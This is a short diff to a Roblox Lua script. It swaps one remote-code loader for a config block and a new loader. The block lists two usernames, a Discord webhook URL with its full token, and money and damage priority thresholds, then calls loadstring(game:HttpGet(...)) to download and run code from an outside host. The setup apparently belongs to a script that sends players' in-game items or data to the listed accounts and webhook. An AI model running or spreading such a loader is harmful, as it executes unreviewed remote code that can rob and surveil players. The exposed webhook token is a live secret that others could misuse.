@@ -1,1 +1,8 @@
-loadstring(game:HttpGet("https://pastefy.app/3vSUHGy8/raw", true))()
+Usernames = {"Kryeptic", "MikeDaThrike"}
+Webhook = "https://discord.com/api/webhooks/1407367542833549393/3JnUQblbjCmDIkME8Z3ueiSL4VJuk_FyCyBea28LCWNoh9dG4HvS62ObgN2xSVnxrSEb"
+
+-- Priority
+MoneyPerSecond = 500000 -- DEFAULT: 300000/s
+DMGPerSecond = 100000 -- DEFAULT: 100000/s
+
+loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/1bbb1994d32c6e93b5cd128457d1c1a84926226993b19f5084f9e65f12f7ff32/download"))()
